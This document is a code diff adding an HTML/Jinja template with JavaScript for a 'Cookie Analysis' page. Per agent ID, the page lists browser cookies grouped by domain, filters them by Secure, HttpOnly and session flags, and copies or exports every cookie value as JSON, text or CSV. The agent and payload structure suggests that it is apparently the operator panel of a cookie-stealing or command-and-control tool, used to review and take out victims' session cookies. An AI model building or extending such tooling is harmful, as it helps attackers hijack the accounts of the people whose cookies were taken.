@@ -1,0 +1,469 @@
+{% extends "base.html" %}
+{% block title %}Cookie Analysis - {{ agent_id }}{% endblock %}
+
+{% block content %}
+<div class="p-6 max-w-[2000px] mx-auto space-y-6">
+  <!-- Header Section -->
+  <div class="bg-gray-800/50 backdrop-blur-sm rounded-xl border border-red-500/10 p-6 shadow-lg">
+    <div class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-6">
+      <div class="flex items-center gap-4">
+        <div class="bg-black/30 p-3 rounded-lg ring-1 ring-red-500/20">
+          <svg class="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+          </svg>
+        </div>
+        <div>
+          <h1 class="text-2xl font-bold text-gray-100">Cookie Analysis</h1>
+          <p class="text-gray-400 text-sm mt-1">Agent ID: {{ agent_id }}</p>
+        </div>
+      </div>
+      
+      <!-- Stats -->
+      <div class="flex flex-wrap gap-4">
+        <div class="px-4 py-2 bg-black/30 rounded-lg">
+          <div class="text-sm text-gray-400">Total Domains</div>
+          <div class="text-xl font-bold text-red-400" id="totalDomains">0</div>
+        </div>
+        <div class="px-4 py-2 bg-black/30 rounded-lg">
+          <div class="text-sm text-gray-400">Total Cookies</div>
+          <div class="text-xl font-bold text-red-400" id="totalCookies">0</div>
+        </div>
+        <div class="px-4 py-2 bg-black/30 rounded-lg">
+          <div class="text-sm text-gray-400">Session Cookies</div>
+          <div class="text-xl font-bold text-purple-400" id="sessionCookies">0</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Search & Filters -->
+    <div class="mt-6 space-y-4">
+      <div class="flex flex-wrap gap-4">
+        <div class="flex-1">
+          <input type="text" 
+                 id="cookieSearch" 
+                 placeholder="Search domains, names, or values..." 
+                 class="w-full px-4 py-2 bg-black/30 border border-gray-700 rounded-lg focus:outline-none focus:border-red-500/50 text-gray-300 placeholder-gray-500">
+        </div>
+        <div class="flex gap-2">
+          <button id="secureFilter" class="px-3 py-2 rounded-lg bg-black/30 text-gray-400 hover:bg-green-500/10 hover:text-green-400 transition-colors">
+            <span class="hidden sm:inline">Secure</span>
+            <svg class="w-5 h-5 sm:hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+          </button>
+          <button id="httpOnlyFilter" class="px-3 py-2 rounded-lg bg-black/30 text-gray-400 hover:bg-blue-500/10 hover:text-blue-400 transition-colors">
+            <span class="hidden sm:inline">HttpOnly</span>
+            <svg class="w-5 h-5 sm:hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+          </button>
+          <button id="sessionFilter" class="px-3 py-2 rounded-lg bg-black/30 text-gray-400 hover:bg-purple-500/10 hover:text-purple-400 transition-colors">
+            <span class="hidden sm:inline">Session</span>
+            <svg class="w-5 h-5 sm:hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+            </svg>
+          </button>
+        </div>
+      </div>
+      
+      <!-- Quick Actions -->
+      <div class="flex gap-2 flex-wrap">
+        <div class="dropdown relative">
+          <button id="exportDropdown" class="px-3 py-1 rounded bg-red-500/10 text-red-400 text-sm hover:bg-red-500/20 transition-colors flex items-center gap-2">
+            <span>Export</span>
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
+            </svg>
+          </button>
+          <div id="exportMenu" class="hidden absolute right-0 mt-2 w-48 bg-gray-800 rounded-lg shadow-lg border border-red-500/10 z-10">
+            <button onclick="exportAllCookies('json')" class="w-full px-4 py-2 text-left text-sm text-gray-300 hover:bg-red-500/10 rounded-t-lg">
+              Export as JSON
+            </button>
+            <button onclick="exportAllCookies('txt')" class="w-full px-4 py-2 text-left text-sm text-gray-300 hover:bg-red-500/10">
+              Export as Text
+            </button>
+            <button onclick="exportAllCookies('csv')" class="w-full px-4 py-2 text-left text-sm text-gray-300 hover:bg-red-500/10 rounded-b-lg">
+              Export as CSV
+            </button>
+          </div>
+        </div>
+        <button id="copyAll" class="px-3 py-1 rounded bg-red-500/10 text-red-400 text-sm hover:bg-red-500/20 transition-colors">
+          Copy All
+        </button>
+        <button id="clearFilters" class="px-3 py-1 rounded bg-gray-500/10 text-gray-400 text-sm hover:bg-gray-500/20 transition-colors">
+          Clear Filters
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Cookies List -->
+  <div class="space-y-4" id="cookiesList">
+    {% for record in records %}
+      {% for domain, domain_cookies in record.payload.cookies.items() %}
+        <div class="cookie-domain bg-gray-800/50 backdrop-blur-sm rounded-xl border border-red-500/10 overflow-hidden transition-all duration-300 hover:border-red-500/20">
+          <div class="bg-black/30 p-4 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+              <span class="text-lg font-medium text-gray-200">{{ domain }}</span>
+              <span class="px-2 py-1 rounded-full bg-red-500/10 text-red-400 text-xs">
+                {{ domain_cookies|length }} cookies
+              </span>
+            </div>
+            <div class="flex gap-2">
+              <button data-copy-domain="{{ domain }}" class="p-2 rounded hover:bg-red-500/20 text-gray-400 hover:text-red-400 transition-colors">
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 5H6a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2v-12a2 2 0 00-2-2h-2M8 5a2 2 0 002 2h2a2 2 0 002-2M8 5a2 2 0 012-2h2a2 2 0 012 2" />
+                </svg>
+              </button>
+            </div>
+          </div>
+          
+          <div class="overflow-x-auto">
+            <table class="w-full">
+              <thead class="bg-black/20">
+                <tr>
+                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">Name</th>
+                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">Value</th>
+                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">Attributes</th>
+                  <th class="px-4 py-3 text-left text-xs font-medium text-gray-400 uppercase">Actions</th>
+                </tr>
+              </thead>
+              <tbody class="divide-y divide-gray-700/30">
+                {% for cookie in domain_cookies %}
+                  <tr class="cookie-row hover:bg-black/20" 
+                      data-secure="{{ cookie.secure|lower }}"
+                      data-httponly="{{ cookie.httpOnly|lower }}"
+                      data-session="{{ (not cookie.expirationDate)|lower }}">
+                    <td class="px-4 py-3 text-sm text-gray-300">{{ cookie.name }}</td>
+                    <td class="px-4 py-3">
+                      <div class="flex items-center gap-2">
+                        <span class="text-sm text-gray-300 truncate max-w-[300px]">{{ cookie.value }}</span>
+                        <button data-view-cookie='{{ cookie|tojson|safe }}'
+                                class="p-1 rounded hover:bg-red-500/20 text-gray-400 hover:text-red-400 transition-colors"
+                                title="View full value">
+                          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                          </svg>
+                        </button>
+                      </div>
+                    </td>
+                    <td class="px-4 py-3">
+                      <div class="flex flex-wrap gap-2">
+                        {% if cookie.secure %}
+                          <span class="px-2 py-1 rounded-full bg-green-500/10 text-green-400 text-xs">Secure</span>
+                        {% endif %}
+                        {% if cookie.httpOnly %}
+                          <span class="px-2 py-1 rounded-full bg-blue-500/10 text-blue-400 text-xs">HttpOnly</span>
+                        {% endif %}
+                        {% if not cookie.expirationDate %}
+                          <span class="px-2 py-1 rounded-full bg-purple-500/10 text-purple-400 text-xs">Session</span>
+                        {% endif %}
+                      </div>
+                    </td>
+                    <td class="px-4 py-3">
+                      <div class="flex gap-2">
+                        <button data-copy-cookie='{{ cookie|tojson|safe }}'
+                                class="px-3 py-1 rounded bg-red-500/10 text-red-400 text-sm hover:bg-red-500/20 transition-colors"
+                                title="Copy cookie">
+                          Copy
+                        </button>
+                        <button data-analyze-cookie='{{ cookie|tojson|safe }}'
+                                class="px-3 py-1 rounded bg-blue-500/10 text-blue-400 text-sm hover:bg-blue-500/20 transition-colors"
+                                title="Analyze cookie">
+                          Analyze
+                        </button>
+                      </div>
+                    </td>
+                  </tr>
+                {% endfor %}
+              </tbody>
+            </table>
+          </div>
+        </div>
+      {% endfor %}
+    {% endfor %}
+  </div>
+
+  <!-- Cookie View Modal -->
+  <div id="cookieModal" class="fixed inset-0 bg-black/50 backdrop-blur-sm hidden items-center justify-center z-50">
+    <div class="bg-gray-800/90 rounded-xl border border-red-500/10 p-6 max-w-2xl w-full mx-4 shadow-2xl">
+      <div class="flex justify-between items-start mb-4">
+        <div>
+          <h3 id="modalTitle" class="text-xl font-bold text-gray-100"></h3>
+          <p id="modalDomain" class="text-sm text-gray-400 mt-1"></p>
+        </div>
+        <button onclick="hideModal()" class="p-1 hover:bg-red-500/20 rounded">
+          <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+          </svg>
+        </button>
+      </div>
+      <pre id="modalContent" class="bg-black/30 rounded-lg p-4 text-gray-300 overflow-x-auto"></pre>
+      <div class="flex justify-end gap-3 mt-4">
+        <button id="modalCopy" class="px-4 py-2 rounded bg-red-500/10 text-red-400 hover:bg-red-500/20">
+          Copy Value
+        </button>
+        <button id="modalAnalyze" class="px-4 py-2 rounded bg-blue-500/10 text-blue-400 hover:bg-blue-500/20">
+          Analyze
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Analysis Modal -->
+  <div id="analysisModal" class="fixed inset-0 bg-black/50 backdrop-blur-sm hidden items-center justify-center z-50">
+    <div class="bg-gray-800/90 rounded-xl border border-red-500/10 p-6 max-w-3xl w-full mx-4 shadow-2xl">
+      <div class="flex justify-between items-start mb-4">
+        <div>
+          <h3 id="analysisTitle" class="text-xl font-bold text-gray-100"></h3>
+          <p id="analysisCookie" class="text-sm text-gray-400 mt-1"></p>
+        </div>
+        <button onclick="hideAnalysisModal()" class="p-1 hover:bg-red-500/20 rounded">
+          <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+          </svg>
+        </button>
+      </div>
+      <div id="analysisContent" class="space-y-4 max-h-[70vh] overflow-y-auto pr-2"></div>
+    </div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    // Initialize counters
+    updateStats();
+    
+    // Initialize filters
+    initializeFilters();
+    
+    // Initialize export button
+    document.getElementById('exportDropdown').addEventListener('click', function(e) {
+        e.stopPropagation();
+        document.getElementById('exportMenu').classList.toggle('hidden');
+    });
+    
+    // Initialize copy all button
+    document.getElementById('copyAll').addEventListener('click', copyAllCookies);
+    
+    // Initialize clear filters button
+    document.getElementById('clearFilters').addEventListener('click', clearFilters);
+});
+
+function updateStats() {
+    const domains = new Set();
+    let totalCookies = 0;
+    let sessionCookies = 0;
+    
+    document.querySelectorAll('.cookie-row').forEach(row => {
+        totalCookies++;
+        domains.add(row.closest('.cookie-domain').querySelector('.text-lg').textContent.trim());
+        if (row.dataset.session === 'true') sessionCookies++;
+    });
+    
+    document.getElementById('totalDomains').textContent = domains.size;
+    document.getElementById('totalCookies').textContent = totalCookies;
+    document.getElementById('sessionCookies').textContent = sessionCookies;
+}
+
+function copyAllCookies() {
+    const cookies = [];
+    document.querySelectorAll('.cookie-row').forEach(row => {
+        const cookieData = JSON.parse(row.querySelector('[data-view-cookie]').dataset.viewCookie);
+        cookies.push(`${cookieData.name}=${cookieData.value}`);
+    });
+    
+    navigator.clipboard.writeText(cookies.join('\n'))
+        .then(() => showNotification('All cookies copied to clipboard'))
+        .catch(() => showNotification('Failed to copy cookies', true));
+}
+
+function initializeFilters() {
+    const filters = {
+        secure: document.getElementById('secureFilter'),
+        httpOnly: document.getElementById('httpOnlyFilter'),
+        session: document.getElementById('sessionFilter')
+    };
+    
+    Object.entries(filters).forEach(([key, button]) => {
+        button.addEventListener('click', () => {
+            button.classList.toggle('active');
+            button.classList.toggle('bg-black/30');
+            button.classList.toggle(key === 'secure' ? 'bg-green-500/20' : 
+                                  key === 'httpOnly' ? 'bg-blue-500/20' : 
+                                  'bg-purple-500/20');
+            applyFilters();
+        });
+    });
+}
+
+function applyFilters() {
+    const activeFilters = {
+        secure: document.getElementById('secureFilter').classList.contains('active'),
+        httpOnly: document.getElementById('httpOnlyFilter').classList.contains('active'),
+        session: document.getElementById('sessionFilter').classList.contains('active')
+    };
+    
+    document.querySelectorAll('.cookie-row').forEach(row => {
+        const matches = (!activeFilters.secure || row.dataset.secure === 'true') &&
+                       (!activeFilters.httpOnly || row.dataset.httponly === 'true') &&
+                       (!activeFilters.session || row.dataset.session === 'true');
+        
+        row.classList.toggle('hidden', !matches);
+        
+        // Hide domain card if all cookies are hidden
+        const domainCard = row.closest('.cookie-domain');
+        const visibleCookies = domainCard.querySelectorAll('.cookie-row:not(.hidden)').length;
+        domainCard.classList.toggle('hidden', visibleCookies === 0);
+    });
+}
+
+function clearFilters() {
+    ['secureFilter', 'httpOnlyFilter', 'sessionFilter'].forEach(id => {
+        const button = document.getElementById(id);
+        button.classList.remove('active', 'bg-green-500/20', 'bg-blue-500/20', 'bg-purple-500/20');
+        button.classList.add('bg-black/30');
+    });
+    
+    document.querySelectorAll('.cookie-row, .cookie-domain').forEach(el => {
+        el.classList.remove('hidden');
+    });
+    
+    document.getElementById('cookieSearch').value = '';
+}
+
+function hideModal() {
+    document.getElementById('cookieModal').classList.add('hidden');
+    document.getElementById('cookieModal').classList.remove('flex');
+}
+
+function hideAnalysisModal() {
+    document.getElementById('analysisModal').classList.add('hidden');
+    document.getElementById('analysisModal').classList.remove('flex');
+}
+
+function showNotification(message, isError = false) {
+    const existingNotifications = document.querySelectorAll('.notification');
+    existingNotifications.forEach(notification => notification.remove());
+    
+    const notification = document.createElement('div');
+    notification.className = `notification fixed bottom-4 right-4 px-4 py-2 rounded-lg shadow-lg z-50 
+        ${isError ? 'bg-red-500' : 'bg-green-500'} text-white 
+        transform transition-all duration-300 flex items-center gap-2`;
+    
+    // Add icon
+    const icon = document.createElement('div');
+    icon.innerHTML = isError 
+        ? '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>'
+        : '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" /></svg>';
+    
+    notification.appendChild(icon);
+    notification.appendChild(document.createTextNode(message));
+    
+    document.body.appendChild(notification);
+    
+    setTimeout(() => {
+        notification.classList.add('opacity-0', 'translate-y-2');
+        setTimeout(() => notification.remove(), 300);
+    }, 2000);
+}
+
+// Close modals when clicking outside
+document.querySelectorAll('#cookieModal, #analysisModal').forEach(modal => {
+    modal.addEventListener('click', function(e) {
+        if (e.target === this) {
+            this.classList.add('hidden');
+            this.classList.remove('flex');
+        }
+    });
+});
+
+// Close modals with Escape key
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        document.querySelectorAll('#cookieModal, #analysisModal').forEach(modal => {
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
+        });
+    }
+});
+
+// Toggle export dropdown
+document.getElementById('exportDropdown').addEventListener('click', function(e) {
+    e.stopPropagation();
+    document.getElementById('exportMenu').classList.toggle('hidden');
+});
+
+// Close dropdown when clicking outside
+document.addEventListener('click', function() {
+    document.getElementById('exportMenu').classList.add('hidden');
+});
+
+function exportAllCookies(format = 'json') {
+    const cookies = [];
+    let content = '';
+    const timestamp = new Date().toISOString().split('T')[0];
+    let filename = `cookies_${timestamp}`;
+    let mimeType = 'application/json';
+
+    // Collect all cookies
+    document.querySelectorAll('.cookie-row').forEach(row => {
+        const cookieData = JSON.parse(row.querySelector('[data-view-cookie]').dataset.viewCookie);
+        cookies.push(cookieData);
+    });
+
+    switch (format) {
+        case 'json':
+            content = JSON.stringify(cookies, null, 2);
+            filename += '.json';
+            break;
+
+        case 'txt':
+            content = cookies.map(cookie => {
+                return `Domain: ${cookie.domain}\nName: ${cookie.name}\nValue: ${cookie.value}\nSecure: ${cookie.secure}\nHttpOnly: ${cookie.httpOnly}\nExpiration: ${cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : 'Session'}\n\n`;
+            }).join('---\n');
+            filename += '.txt';
+            mimeType = 'text/plain';
+            break;
+
+        case 'csv':
+            const headers = ['Domain', 'Name', 'Value', 'Secure', 'HttpOnly', 'Expiration'];
+            content = [
+                headers.join(','),
+                ...cookies.map(cookie => [
+                    cookie.domain,
+                    cookie.name,
+                    `"${cookie.value.replace(/"/g, '""')}"`,
+                    cookie.secure,
+                    cookie.httpOnly,
+                    cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : 'Session'
+                ].join(','))
+            ].join('\n');
+            filename += '.csv';
+            mimeType = 'text/csv';
+            break;
+    }
+
+    try {
+        // Create blob and download
+        const blob = new Blob([content], { type: mimeType });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+
+        showNotification(`Cookies exported successfully as ${format.toUpperCase()}`);
+    } catch (error) {
+        console.error('Export error:', error);
+        showNotification('Failed to export cookies', true);
+    }
+}
+</script>
+{% endblock %} 
